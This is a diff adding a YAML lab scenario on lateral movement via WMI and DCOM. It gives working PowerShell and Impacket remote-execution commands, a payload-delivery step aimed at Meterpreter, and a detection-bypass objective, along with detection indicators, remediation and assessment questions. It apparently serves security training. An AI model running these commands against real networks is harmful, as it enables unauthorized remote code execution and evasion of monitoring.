@@ -1,0 +1,99 @@
+# Category: Lateral Movement
+name: "DCOM and WMI Lateral Movement – Remote Command Execution"
+id: "lateral-dcom-wmi-001"
+category: "lateral_movement"
+subcategory: "dcom_wmi"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Use DCOM (Distributed Component Object Model) or WMI (Windows Management
+  Instrumentation) to execute commands on remote machines with valid
+  credentials. This is a common lateral movement technique without using
+  SMB or PsExec.
+
+learning_objectives:
+  - Understand DCOM and WMI remote execution
+  - Use PowerShell or Impacket to execute commands
+  - Create a service using WMI to run payload
+  - Bypass detection by using native protocols
+
+tools:
+  - PowerShell (Invoke-WmiMethod, New-CimSession)
+  - Impacket (wmiexec, dcomexec)
+  - CrackMapExec (wmi)
+  - Metasploit (wmi_exec)
+
+prerequisites:
+  - Valid credentials (domain or local)
+  - Firewall allows DCOM/WMI ports (135, 445, 5985)
+  - Target system is accessible
+
+steps:
+  - id: "step1"
+    phase: "setup"
+    action: "Use WMI to execute a command"
+    commands:
+      - "# PowerShell"
+      - "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc.exe' -ComputerName <TARGET> -Credential $cred"
+      - "# Or using Impacket"
+      - "wmiexec.py <DOMAIN>/<USER>:<PASS>@<TARGET> 'whoami'"
+    expected_output: "Command executed on target"
+    detection: "Windows event 4688 (process creation) with remote user"
+
+  - id: "step2"
+    phase: "dcom"
+    action: "Use DCOM via PowerShell"
+    commands:
+      - "# Using Invoke-CimMethod"
+      - "$sess = New-CimSession -ComputerName <TARGET>"
+      - "Invoke-CimMethod -CimSession $sess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc.exe'}"
+    expected_output: "Process launched"
+    detection: "DCOM logs may show activation"
+
+  - id: "step3"
+    phase: "post"
+    action: "Use for payload delivery"
+    expected_output: "Meterpreter or shell"
+    detection: "Network traffic to WMI/DCOM ports"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1047"
+    description: "Windows Management Instrumentation"
+  - standard: "NIST SP 800-53"
+    control: "AC-6"
+    description: "Least Privilege"
+
+detection:
+  network_indicators:
+    - "DCOM/RPC traffic (135, 49152-65535)"
+  log_indicators:
+    - "Event 4688 (process creation) with remote logon type 3 or 10"
+  endpoint_indicators:
+    - "wmic, powershell with WMI"
+
+remediation:
+  immediate:
+    - "Restrict WMI/DCOM access to authorized users"
+    - "Use firewall rules to block remote WMI ports"
+  long_term:
+    - "Enable Windows Firewall logging"
+    - "Monitor for WMI event subscriptions"
+
+variables:
+  target_ip: "192.168.1.10"
+  domain: "contoso"
+  user: "jdoe"
+  password: "P@ssw0rd"
+
+assessment_questions:
+  - "What ports are used by WMI and DCOM?"
+  - "How can you detect WMI lateral movement?"
+  - "What are the advantages of using DCOM over PsExec?"
+
+references:
+  - url: "https://attack.mitre.org/techniques/T1047/"
+    title: "MITRE T1047"
+  - url: "https://www.ired.team/offensive-security/lateral-movement/t1047-wmi-for-lateral-movement"
+    title: "WMI Lateral Movement"
